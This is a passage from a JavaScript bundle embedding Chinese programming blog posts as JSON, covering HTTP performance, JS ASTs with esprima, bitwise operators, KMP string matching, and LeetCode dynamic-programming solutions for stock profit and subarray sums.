NodeJS</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-13","timeArr":[2018,10,13,0,0,0,0],"title":"GraphQL服务器的简易实现","uuid":"9b5e4a6871e0353c0cbc1f47c9de37eabe73f5da","summary":"<ul>\\n<li>\\n<p>为什么要实现一个<code>GraphQL</code>服务器</p>\\n<p>通过自己实现，更深入了解<code>GraphQL</code>怎么构造，怎么获取，一些术语</p>\\n</li>\\n<li>\\n<p>直接入正题，如何实现一个<code>GraphQL</code>服务器</p>\\n<p>了解4种类型</p>\\n<ul>\\n<li>\\n<p>Query</p>\\n<p>执行内容查询</p>\\n</li>\\n<li>\\n<p>Muta...</p>\\n</li>\\n</ul>\\n</li>\\n</ul>","slug":"GraphQL-fu-wu-qi-de-jian-yi-shi-xian","sha":"2df708b7274da2278a0b10daebf16bf60e8a965f"}')},554:function(n){n.exports=JSON.parse('{"content":"<p>影响<code>Http</code>性能的几点：</p>\\n<ol>\\n<li><p>TCP 慢启动</p>\\n<p> 指的是TCP连接最初会被限制连接最大速度，只有当数据传送成功，才会逐步提高传输速度，这是为了防止因特网突然过载和拥塞。</p>\\n</li>\\n<li><p><code>Nagle</code>算法</p>\\n<p> 将大量TCP数据绑定在一起，避免大量的小数据的分组。但问题是，可能因为等待其他TCP数据产生延迟。</p>\\n<p> 开启<code>TCP_NODELAY</code>选项可以禁用<code>Nagle</code>算法，需要尽量确保发送大块数据。</p>\\n</li>\\n<li><p>TIME_WAIT</p>\\n<p> 指的是在关闭TCP连接时，会有一小段信息缓存最近关闭的IP地址和端口号，维持<code>2MSL</code>，这段时间内无法创建相同的IP地址和端口号。</p>\\n<blockquote>\\n<p>MSL：Maximum Segment Lifetime，规定是2分钟，实际也有30秒，1分钟。</p>\\n</blockquote>\\n<p> 之所以等待<code>2MSL</code>是为了保证客户端发送的最后一个ACK报文能够到达服务端。</p>\\n</li>\\n<li><p>串行事务处理</p>\\n<p> 如果每个事务都需要建立一条新的链接，那么连接时延和慢启动时延就会叠加起来。</p>\\n</li>\\n</ol>\\n<p>解决<code>Http</code>性能的几点：</p>\\n<ol>\\n<li><p>并行连接</p>\\n<p> 客户端打开多条连接，并行地执行多个HTTP事务，充分利用因特网的带宽，但还是受慢启动影响。</p>\\n</li>\\n<li><p>持久连接</p>\\n<p> 避免慢启动阶段和重复发送报文头部，但要注意避免累积大量空闲连接。</p>\\n<p> <code>keep-alive</code>首部发送请求，需要服务器返回<code>Connection:Keep-Alive</code>首部，否则客户端认为服务端不支持<code>keep-alive</code>。</p>\\n<p> 参数<code>timeout</code>，估计了服务器希望连接保持活跃的时间，并不是一个承诺值。</p>\\n<p> 参数<code>max</code>，估计了服务器希望为多少个事务保持连接活跃状态，并不是一个承诺值。</p>\\n<p> http1.0 使用<code>connection:keep-alive</code>开启持久连接。</p>\\n<p> http1.1默认开启持久连接，名为<code>persistent connection</code>,当需要关闭时，发送<code>connection:close</code>。</p>\\n</li>\\n<li><p>管道化连接</p>\\n<p> http1.1 在持久连接上可选择使用请求管道。</p>\\n<p> 使用管道化能在请求的同时，继续后续的请求，提高性能，但不应该使用有副作用的请求。</p>\\n</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2019-04-11","timeArr":[2019,3,11,0,0,0,0],"title":"《Http权威指南》http性能","uuid":"2d6cd16c42d4c8dc0c9ccfed027881544a800d15","summary":"<p>影响<code>Http</code>性能的几点：</p>\\n<ol>\\n<li>\\n<p>TCP 慢启动</p>\\n<p>指的是TCP连接最初会被限制连接最大速度，只有当数据传送成功，才会逐步提高传输速度，这是为了防止因特网突然过载和拥塞。</p>\\n</li>\\n<li>\\n<p><code>Nagle</code>算法</p>\\n<p>将大量TCP数据绑定在一起，避免大量的小数据的分组。但问题是，可能因为等待其他TCP数据产...</p>\\n</li>\\n</ol>","slug":"Http-quan-wei-zhi-nan-http-xing-neng","sha":"b037d4e8d3b90a0aa21d65b03af8e28caf013de4"}')},555:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"shi-yong-ast-wan-cheng-xu-qiu\\">使用AST完成需求</h4>\\n<p>需求：输出方法中的参数为字符串&#39;1234&#39;的变量名</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">x</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-built_in\\">parseInt</span>(<span class=\\"hljs-string\\">\'1234\'</span>);\\n  <span class=\\"hljs-keyword\\">var</span> b=<span class=\\"hljs-string\\">\'1234\'</span>;\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">double</span>(<span class=\\"hljs-params\\">n</span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> n*<span class=\\"hljs-number\\">2</span>\\n  }\\n  <span class=\\"hljs-keyword\\">var</span> c=double(<span class=\\"hljs-string\\">\'1234\'</span>);\\n  <span class=\\"hljs-keyword\\">var</span> d=double(<span class=\\"hljs-number\\">1234</span>);\\n  <span class=\\"hljs-keyword\\">var</span> e=(<span class=\\"hljs-string\\">\'1234\'</span>)*<span class=\\"hljs-number\\">2</span>;\\n  <span class=\\"hljs-keyword\\">var</span> f=<span class=\\"hljs-string\\">\\"double(\'1234\')\\"</span>;\\n}</code></pre></code></pre>\\n<p>如果使用正则，我们需要定义：</p>\\n<ol>\\n<li>需要在方法参数内(括号前面必须是符合命名格式的方法名)，过滤b,e</li>\\n<li>必须是字符串1234，过滤d</li>\\n<li>必须在方法调用内，而不是字符串内，过滤f</li>\\n</ol>\\n<p>因为如果用正则处理，会比较繁琐</p>\\n<p>尝试使用AST，直接上代码</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> esprima=<span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'esprima\'</span>);\\n<span class=\\"hljs-keyword\\">const</span> estraverse =<span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'estraverse\'</span>);\\n\\n<span class=\\"hljs-keyword\\">const</span> ast=esprima.parse(x.toString())\\nestraverse.traverse(ast, {\\n  <span class=\\"hljs-attr\\">enter</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">node,parent</span>) </span>{\\n    <span class=\\"hljs-keyword\\">if</span>(node.type===<span class=\\"hljs-string\\">\\"CallExpression\\"</span> <span class=\\"hljs-comment\\">// 对应正则中第3条</span>\\n      &amp;&amp; node.callee.type===<span class=\\"hljs-string\\">\\"Identifier\\"</span>  <span class=\\"hljs-comment\\">// 对应正则中第1条</span>\\n      &amp;&amp; node.arguments[<span class=\\"hljs-number\\">0</span>].value===<span class=\\"hljs-string\\">\\"1234\\"</span>\\n      ){ <span class=\\"hljs-comment\\">// 对应正则中第2条</span>\\n      node.arguments[<span class=\\"hljs-number\\">0</span>].value=\\n      <span class=\\"hljs-built_in\\">console</span>.log(parent.id.name) \\n    }\\n  }\\n});\\n<span class=\\"hljs-comment\\">// a</span>\\n<span class=\\"hljs-comment\\">// c</span></code></pre></code></pre>\\n","toc":[{"anchor":"shi-yong-ast-wan-cheng-xu-qiu","level":4,"text":"使用AST完成需求"}],"relatedTags":null,"created_at":"2018-06-27","timeArr":[2018,5,27,0,0,0,0],"title":"JS的AST(Esprima.parse)","uuid":"36b0972f79325bab8c6db377892c184e894e5492","summary":"<h4>使用AST完成需求</h4>\\n<p>需求：输出方法中的参数为字符串\'1234\'的变量名</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">x</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-built_in\\">parseInt</span>(<span class=\\"hljs-string\\">\'1234\'</span>);\\n  <span class=\\"hljs-keyword\\">var</span> b=<span class=\\"hljs-string\\">\'1234\'</span>;\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">double</span>(<span class=\\"hljs-params\\">n</span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> n*<span class=\\"hljs-number\\">2</span>\\n  }\\n  <span class=\\"hljs-keyword\\">var</span> c=double...</code></pre>","slug":"JS-de-AST(Esprima.parse)","sha":"8446b12b208921dadb0f44d47ca83eb637509139"}')},556:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"js-an-wei-cao-zuo-fu\\">JS按位操作符</h2>\\n<ul>\\n<li><p>按位异或(^)：二进制编码中，每一位两者相同，则为0，两者不同，则为1</p>\\n</li>\\n<li><p>按位与 (&amp;)：二进制编码中，每一位两者都为1，则为1，否则，则为0</p>\\n</li>\\n<li><p>按位或 (|)：二进制编码中，每一位两者其中一个为1，则为1，否则，则为0</p>\\n</li>\\n<li><p>按位非(~)：二进制编码中，每一位的反码，1为0，0为1（十进制数值的负数-1）</p>\\n</li>\\n<li><p>左移(&lt;&lt;) 右移(&gt;&gt;)：转换成32位二进制编码后进行移位，其中最左侧位为符号位，数字只占用31位</p>\\n<p>  对Math.pow(2,31)-1以内的数值，符合以下等式\\n  <code>n&gt;&gt;m===parseInt(n/Math.pow(2,m))</code></p>\\n</li>\\n</ul>\\n<ul>\\n<li><p>无符号右移(&gt;&gt;&gt;) 无符号左移(&lt;&lt;&lt;)：转换成32位二进制编码后进行移位，无符号位</p>\\n<p>  对Math.pow(2,32)-1以内的数值符合以下等式\\n  <code>n&gt;&gt;&gt;m===parseInt(n/Math.pow(2,m))</code></p>\\n</li>\\n</ul>\\n<h2 id=\\"shi-yong\\">使用</h2>\\n<ol>\\n<li><p>Hamming distance(海明距离)</p>\\n<p> 当两个二进制编码中，对应位数不同的次数</p>\\n<p> 例如：10001和11000，其中第2，5位不同，海明距离为2</p>\\n<p> 计算方式：可用^（异或），然后计算1的次数</p>\\n</li>\\n<li><p>判断某个数字的二进制格式有多少个1</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcBitSet</span>(<span class=\\"hljs-params\\">n</span>)</span>{\\n<span class=\\"hljs-keyword\\">let</span> count=<span class=\\"hljs-number\\">0</span>,tmp=n\\n<span class=\\"hljs-keyword\\">while</span>(tmp){\\n count++;\\n <span class=\\"hljs-comment\\">// 每次执行都会消除最后一个1</span>\\n tmp = tmp &amp; (tmp - <span class=\\"hljs-number\\">1</span>);\\n}\\n<span class=\\"hljs-keyword\\">return</span> count\\n}</code></pre></code></pre>\\n</li>\\n</ol>\\n","toc":[{"anchor":"js-an-wei-cao-zuo-fu","level":2,"text":"JS按位操作符"},{"anchor":"shi-yong","level":2,"text":"使用"}],"relatedTags":null,"created_at":"2018-07-03","timeArr":[2018,6,3,0,0,0,0],"title":"JS中位操作","uuid":"18afb8f32bc7fc0b2ce146673e4998010db08a12","summary":"<h4>JS按位操作符</h4>\\n<ul>\\n<li>按位异或(^)：二进制编码中，每一位两者相同，则为0，两者不同，则为1</li>\\n<li>按位与 (&amp;)：二进制编码中，每一位两者都为1，则为1，否则，则为0</li>\\n<li>按位或 (|)：二进制编码中，每一位两者其中一个为1，则为1，否则，则为0</li>\\n<li>按位非(~)：二进制编码中，每一位的反码，1为0，0为1（十进...</li>\\n</ul>","slug":"JS-zhong-wei-cao-zuo","sha":"50c40330555ea317421cc46a84ff4b6fe23f1cc1"}')},557:function(n){n.exports=JSON.parse('{"content":"<p>KMP算法中，当对应的字符不匹配时，需要对前一个索引进行回溯</p>\\n<p>一般写法是：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcNext</span>(<span class=\\"hljs-params\\">str,pat</span>)</span>{\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-keyword\\">if</span>(str[k]!==str[j]){\\n    <span class=\\"hljs-comment\\">// 有些会写成k=next[k]，原理是一样的</span>\\n    <span class=\\"hljs-comment\\">// 这里k表示，所对应当前正在进行对比的索引</span>\\n    <span class=\\"hljs-comment\\">// k=next[k-1]表示找到k的前一位的公共匹配前后缀的数量，作为新的对比索引</span>\\n    k=next[k<span class=\\"hljs-number\\">-1</span>]\\n  }\\n}</code></pre></code></pre>\\n<p><img src=\\"/article/img/KPM%E5%9B%BE%E8%A7%A3.png\\" alt=\\"\\"></p>\\n<p>图中，当K和J不能匹配时，A和B是已经匹配的公共前后缀</p>\\n<p>因此A和B是完全相等</p>\\n<p>A内部的A1,A2是已经匹配的公共前后缀</p>\\n<p>B内部的B1,B2是已经匹配的公共前后缀</p>\\n<p>因此A1===A2===B1===B2</p>\\n<p>要想找到可能和J匹配的最大公共前后缀，只能找A的前缀(因为A的后缀连着k，而k不相等，所以k不能用了，只能找它前面的)，与J进行比较</p>\\n<p>也就是从<code>next[k-1]</code>开始匹配</p>\\n<p>代码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcNext</span>(<span class=\\"hljs-params\\">str</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>,k=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">let</span> next=[]\\n  next[<span class=\\"hljs-number\\">0</span>]=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">while</span>(i &lt; str.length){\\n    <span class=\\"hljs-comment\\">// 不相等时</span>\\n    <span class=\\"hljs-keyword\\">if</span>(str[i]!==str[k]){\\n      <span class=\\"hljs-comment\\">// 如果k已经是0了(最小就是0)，直接设置成0</span>\\n      <span class=\\"hljs-keyword\\">if</span>(k===<span class=\\"hljs-number\\">0</span>)next[i++]=k\\n        <span class=\\"hljs-comment\\">// 否则就回溯到前一个公共前缀的位置</span>\\n      <span class=\\"hljs-keyword\\">else</span> {\\n        k=next[k<span class=\\"hljs-number\\">-1</span>]\\n      }\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n      <span class=\\"hljs-comment\\">// 相等，就直接在k的索引上+1，表示匹配的length</span>\\n      next[i]=k+<span class=\\"hljs-number\\">1</span>\\n      i++;\\n      k++;\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> next\\n}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">kpm</span>(<span class=\\"hljs-params\\">str,pat</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(pat.length===<span class=\\"hljs-number\\">0</span>) <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">let</span> next=calcNext(pat)\\n  <span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>,j=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">while</span>(i&lt;str.length ){\\n    <span class=\\"hljs-keyword\\">if</span>(str[i]===pat[j]){\\n      i++;j++\\n      <span class=\\"hljs-comment\\">// j===pat.length说明已经匹配成功</span>\\n      <span class=\\"hljs-keyword\\">if</span>(j===pat.length) <span class=\\"hljs-keyword\\">return</span> i-j\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n      <span class=\\"hljs-keyword\\">if</span>(j===<span class=\\"hljs-number\\">0</span>){\\n        i++\\n      }<span class=\\"hljs-keyword\\">else</span>{\\n        j=next[j<span class=\\"hljs-number\\">-1</span>]\\n      }\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-number\\">-1</span>\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-09","timeArr":[2018,7,9,0,0,0,0],"title":"KMP回溯分析","uuid":"d19b06a421c09a6a7e3d012ce39d42cf0cfc380b","summary":"<p>KMP算法中，当对应的字符不匹配时，需要对前一个索引进行回溯</p>\\n<p>一般写法是：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcNext</span>(<span class=\\"hljs-params\\">str,pat</span>)</span>{\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-keyword\\">if</span>(str[k]!==str[j]){\\n    <span class=\\"hljs-comment\\">// 有些会写成k=next[k]，原理是一样的</span>\\n    <span class=\\"hljs-comment\\">// 这里k表示，所对应当前正在进行对比的...</span></code></pre>","slug":"KMP-hui-su-fen-xi","sha":"dcb12fd298b9d963db9b1d4b12cbff7da94227bc"}')},558:function(n){n.exports=JSON.parse('{"content":"<p><code>Leetcode</code>上有一系列类似的题目，看了几位大神的答案，感觉这类题目都能套用，都是DP(动态规划)的思路。</p>\\n<p>题目1：</p>\\n<p>给出一个数组，其中每一个元素表示第<code>i</code>天的价格。</p>\\n<p>你可以多次交易，但同一天只能交易1次，求交易获取最大值。</p>\\n<p>例如：<code>[1,6,0,3,4,8,2]</code></p>\\n<p>最大收益为：<code>6-1 + 8-0</code>=13</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> prev_sell,prev_buy,prev_rest,\\n      sell=<span class=\\"hljs-number\\">0</span>,buy=-prices[<span class=\\"hljs-number\\">0</span>],rest=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n      prev_buy=buy;prev_rest=rest;prev_sell=sell\\n      sell=prev_buy+prices[i]\\n      buy=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest-prices[i],prev_buy,prev_sell-prices[i])\\n      rest=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest,prev_sell)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-built_in\\">Math</span>.max(sell,rest)\\n}</code></pre></code></pre>\\n<p>虽然对于这道题，有一种解法更简单，就是只要<code>prices[i]-pries[i-1]</code>是正数，就算到profit里面。</p>\\n<p>但上面的是一种模式，对于此种类型的题，都可以套用这套模式。</p>\\n<p>思路：</p>\\n<ol>\\n<li>每一天都有可能3种行动，sell, buy, rest(什么都不做)。</li>\\n<li>如果第i天是sell，那么它的前面一定已经买了(buy)，<code>sell=prev_buy+prices[i]</code></li>\\n<li>如果第i天是buy，那么它的前面有可能刚卖出去，<code>prev_sell-prices[i]</code>，\\n有可能是休息，<code>prev_rest-prices[i]</code>,也有可能是保持买的状态，<code>prev_buy</code>，例如<code>1,2,3</code>，就是买了1,到了3才卖。</li>\\n<li>如果第i天是rest，那么它前面有可能，买、卖、休息，但前面是买一定会小，所以<code>Math.max(prev_rest,prev_sell)</code></li>\\n</ol>\\n<p>最后只要比较最后一天的行动是卖出还是休息，比较哪个更大就是最大收益。</p>\\n<p>题目2：</p>\\n<p>给出一个数组，其中每一个元素表示第<code>i</code>天的价格。</p>\\n<p>你可以多次交易，但同一天只能交易1次，并且每次交易完成有手续费，求交易获取最大值。</p>\\n<p>例如：<code>[1,6,0,3,4,8,2]</code>，手续费是<code>6</code></p>\\n<p>最大收益为：<code>8-0-6</code>=2</p>\\n<p>直接套模板，每次sell要扣去手续费便可</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices,fee</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> prev_sell,prev_buy,prev_rest,\\n      sell=<span class=\\"hljs-number\\">0</span>,buy=-prices[<span class=\\"hljs-number\\">0</span>],rest=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n      prev_buy=buy;prev_rest=rest;prev_sell=sell\\n      <span class=\\"hljs-comment\\">// 这里加了fee</span>\\n      sell=prev_buy+prices[i]-fee\\n      buy=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest-prices[i],prev_buy,prev_sell-prices[i])\\n      rest=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest,prev_sell)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-built_in\\">Math</span>.max(sell,rest)\\n}</code></pre></code></pre>\\n<p>题目3：</p>\\n<p>给出一个数组，其中每一个元素表示第<code>i</code>天的价格。</p>\\n<p>你可以多次交易，但同一天只能交易1次，并且每次交易完成必须休息一天，求交易获取最大值。</p>\\n<p>例如：<code>[1,6,0,3,4,8,2]</code></p>\\n<p>最大收益为：<code>6-1 + 8-3</code>=10</p>\\n<p>套模板，只是买的那一天之前不能是卖出，必须是休息或者保持买的状态。</p>\\n<p><code>buy=Math.max(prev_rest-prices[i],prev_buy,prev_sell-prices[i])</code></p>\\n<p><code>---&gt;</code></p>\\n<p><code>buy=Math.max(prev_rest-prices[i],prev_buy)</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> prev_sell,prev_buy,prev_rest,\\n      sell=<span class=\\"hljs-number\\">0</span>,buy=-prices[<span class=\\"hljs-number\\">0</span>],rest=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n      prev_buy=buy;prev_rest=rest;prev_sell=sell\\n      sell=prev_buy+prices[i]\\n      <span class=\\"hljs-comment\\">// 此处不能是卖出后立刻买</span>\\n      buy=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest-prices[i],prev_buy)\\n      rest=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest,prev_sell)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-built_in\\">Math</span>.max(sell,rest)\\n}</code></pre></code></pre>\\n<p>题目4：</p>\\n<p>给出一个数组，其中每一个元素表示第<code>i</code>天的价格。</p>\\n<p>你可以交易1次，同一天只能交易1次，求交易获取最大值。</p>\\n<p>例如：<code>[1,6,0,3,4,8,2]</code></p>\\n<p>最大收益为：<code>0 买 8卖</code>=8</p>\\n<p>因为这里只能交易1次，我们不用定义之前的情况<code>prev_buy</code>,<code>prev_rest</code>,<code>prev_sell</code></p>\\n<p>只需要定义一个买入，一个卖出便可。</p>\\n<p>代码如下：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices</span>)</span>{\\n    <span class=\\"hljs-keyword\\">let</span> sell=<span class=\\"hljs-number\\">0</span>,buy=-prices[<span class=\\"hljs-number\\">0</span>]\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n        sell=<span class=\\"hljs-built_in\\">Math</span>.max(buy+prices[i],sell)\\n        buy=<span class=\\"hljs-built_in\\">Math</span>.max(-prices[i],buy)\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> sell\\n}</code></pre></code></pre>\\n<p>题目5：</p>\\n<p>给出一个数组，其中每一个元素表示第<code>i</code>天的价格。</p>\\n<p>你可以最多交易2次，同一天只能交易1次，求交易获取最大值。</p>\\n<p>例如：<code>[1,6,0,3,4,8,2]</code></p>\\n<p>最大收益为：<code>1买 6卖+0买 8卖</code>=13</p>\\n<p>同上一题，这里最多交易2次，因此不需要定义<code>prev</code>情况</p>\\n<p>只需要定义2个买入，2个卖出便可。</p>\\n<p>代码如下：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices</span>)</span>{\\n    <span class=\\"hljs-keyword\\">let</span> sell1=<span class=\\"hljs-number\\">0</span>,buy1=-prices[<span class=\\"hljs-number\\">0</span>],sell2=<span class=\\"hljs-number\\">0</span>,buy2=-prices[<span class=\\"hljs-number\\">0</span>]\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n        sell1=<span class=\\"hljs-built_in\\">Math</span>.max(buy1+prices[i],sell1)\\n        buy1=<span class=\\"hljs-built_in\\">Math</span>.max(buy1,-prices[i])\\n        sell2=<span class=\\"hljs-built_in\\">Math</span>.max(buy2+prices[i],sell2)\\n        buy2=<span class=\\"hljs-built_in\\">Math</span>.max(-prices[i]+sell1,buy2)\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> sell2\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-19","timeArr":[2018,9,19,0,0,0,0],"title":"LeetCode获取最大收益的算法","uuid":"4483d4ae741e5f281dba7c87dd850e305a2b0565","summary":"<p><code>Leetcode</code>上有一系列类似的题目，看了几位大神的答案，感觉这类题目都能套用，都是DP(动态规划)的思路。</p>\\n<p>题目1：</p>\\n<p>给出一个数组，其中每一个元素表示第<code>i</code>天的价格。</p>\\n<p>你可以多次交易，但同一天只能交易1次，求交易获取最大值。</p>\\n<p>例如：<code>[1,6,0,3,4,8,2]</code></p>\\n<p>最大收益为：<code>6-1 + 8-0</code>...</p>","slug":"LeetCode-huo-qu-zui-da-shou-yi-de-suan-fa","sha":"61921acd4c40080ae873343cffc1a26316b6f608"}')},559:function(n){n.exports=JSON.parse('{"content":"<p>一个只包含正数的数组，找三个长度为k的不重叠的子数组，使得所有子数组的数字之和最大。</p>\\n<p>例如：</p>\\n<pre><code><pre class=\\"hljs\\"><code>Input: [1,2,1,2,6,7,5,1], 2\\nOutput: [0, 3, 5]\\nExplanation: Subarrays [1, 2], [2, 6], [7, 5] correspond to the starting indices [0, 3, 5].\\nWe could have also taken [2, 1], but an answer of [1, 3, 5] would be lexicographically larger.</code></pre></code></pre><p>思路：</p>\\n<ol>\\n<li><p>因为是分割成3段，设定为left,mid,right。</p>\\n</li>\\n<li><p>定义一个数组<code>sums</code>，它记录从0到<code>nums.length-k</code>上每一个对应<code>k</code>个子数组的和。</p>\\n<p> 例如：nums:<code>[1,2,3,4]</code>,k:<code>2</code>，那么sums就是<code>[1+2,2+3,3+4]</code></p>\\n</li>\\n<li><p>计算<code>left</code>，使<code>left</code>从左到右记录当前最大<code>index</code>。</p>\\n<p> 计算<code>right</code>，使<code>right</code>从右到左记录当前最大<code>index</code>。</p>\\n<p> 这么做是因为当<code>left</code>和<code>right</code>记录好了后，就可以直接控制mid的<code>index</code>，来计算当前和。</p>\\n<p> 如果<code>mid</code>的起始<code>index</code>是<code>n</code>，那么当前左端范围内的最大值就是<code>left[n-k]</code>，\\n 当前右端范围内的最大值就是<code>right[n+k]</code>。</p>\\n<p> 如下图，假设这是一个<code>left</code>，<code>k</code>为2，当前left范围是0~8，那么这个范围内最大值一定是8这个位置。</p>\\n<p> 注意：这里的值并不是实际值，而是对应<code>sums</code>的<code>index</code>所对应的值。</p>\\n<pre><code><pre class=\\"hljs\\"><code> k=2\\n       |_|_|_|_|_|_|_|_|\\n  值： 1 2 2 3 4 4 4 5 5\\n  idx：0 1 2 3 4 5 6 7 8</code></pre></code></pre><p> 如果范围缩小，0~3，那么最大值一定是3这个位置</p>\\n<pre><code><pre class=\\"hljs\\"><code> k=2\\n       |_|_|_|\\n  值： 1 2 2 3\\n  idx：0 1 2 3</code></pre></code></pre><p> 因此<code>left</code>需要从左往右进行获取最大值。</p>\\n<p> 假设这是一个<code>right</code>，<code>k</code>为2，当前right范围是4~7，那么这个范围内最大值一定是4这个位置</p>\\n<pre><code><pre class=\\"hljs\\"><code> k=2\\n       |_|_|_|\\n  值： 4 4 5 6\\n  idx：4 5 6 7</code></pre></code></pre><p> 因此<code>right</code>需要从右往左进行获取最大值。</p>\\n</li>\\n<li><p>算出<code>left</code>和<code>right</code>后就简单了，我们只需要将符合<code>mid</code>的范围<code>[k,nums.length-k)</code>遍历一遍，\\n 每次遍历都算出当前三个段的和，求出最大和便可。</p>\\n</li>\\n</ol>\\n<p>代码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxSumOfThreeSubarrays</span>(<span class=\\"hljs-params\\">nums,k</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> len=nums.length-k+<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">let</span> left=[],right=[],maxIndex=<span class=\\"hljs-number\\">0</span>,sums=[],sum=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span 